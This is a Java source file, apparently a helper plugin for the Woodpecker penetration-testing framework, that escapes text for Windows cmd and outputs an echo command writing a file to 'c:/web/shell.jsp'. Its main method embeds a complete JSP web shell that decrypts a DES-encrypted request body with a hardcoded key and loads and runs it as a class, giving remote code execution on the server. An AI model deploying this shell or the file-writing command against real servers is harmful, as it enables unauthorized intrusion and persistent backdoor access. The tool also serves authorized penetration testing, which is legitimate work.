package me.gv7.woodpecker.plugin.payload;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class WindowsEchoTextConverter implements IHelper {
    public static String strConverter(String text){
        String payload = text
                .replace("\n","")
                .replace("^","^^")
                .replace("\"","^\"")
                .replace("&","^&")
                .replace("|","^|")
                .replace("<","^<")
                .replace(">","^>");
        return payload;
    }


    public static void main(String[] args) throws Exception{
        String payload = strConverter("<%\n" +
                "    try {\n" +
                "        Class.forName(\"UserActionSK\").getMethod(\"invoke\", HttpServletRequest.class, HttpServletResponse.class).invoke(null, request, response);\n" +
                "    } catch (ClassNotFoundException e) {\n" +
                "        try {\n" +
                "            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n" +
                "            method.setAccessible(true);\n" +
                "            java.io.InputStream inputStream = request.getInputStream();\n" +
                "            java.io.ByteArrayOutputStream byteArrayOutputStream = new java.io.ByteArrayOutputStream();\n" +
                "            int n = 0;\n" +
                "            while ((n = inputStream.read()) != -1)\n" +
                "                byteArrayOutputStream.write(n);\n" +
                "            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"DES\");\n" +
                "            cipher.init(2, javax.crypto.SecretKeyFactory.getInstance(\"DES\").generateSecret(new javax.crypto.spec.DESKeySpec(\"b50af098\".getBytes())));\n" +
                "            byte[] ddat = cipher.doFinal(byteArrayOutputStream.toByteArray());\n" +
                "            method.invoke(Thread.currentThread().getContextClassLoader(), \"UserActionSK\", ddat, 0, ddat.length);\n" +
                "            response.addCookie(new Cookie(\"X-Ua-Compatible\", java.util.UUID.randomUUID().toString()));\n" +
                "        } catch (Exception ee) {\n" +
                "        }\n" +
                "    }\n" +
                "    out.clear();\n" +
                "%>");

        System.out.println(payload);
    }

    @Override
    public String getHelperTabCaption() {
        return "Window Echo To File";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = EchoTextConverter.pluginHelper.createArgsUsageBinder();
        List<IArgs> args = new ArrayList<IArgs>();
        IArgs args1 = EchoTextConverter.pluginHelper.createArgs();
        args1.setName("all");
        args1.setDefaultValue("<%out.write(\"1\");%>");
        args1.setDescription("write text");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, String> customArgs, IResultOutput iResultOutput) {
        String text = customArgs.get("all");
        try {
            String payload = strConverter(text);
            iResultOutput.successPrintln("Converter finish! command:");
            iResultOutput.rawPrintln("\n");
            String command = String.format("echo %s > c:/web/shell.jsp",payload);
            iResultOutput.rawPrintln(command);
            iResultOutput.rawPrintln("\n");

        }catch (Exception e){}
    }
}
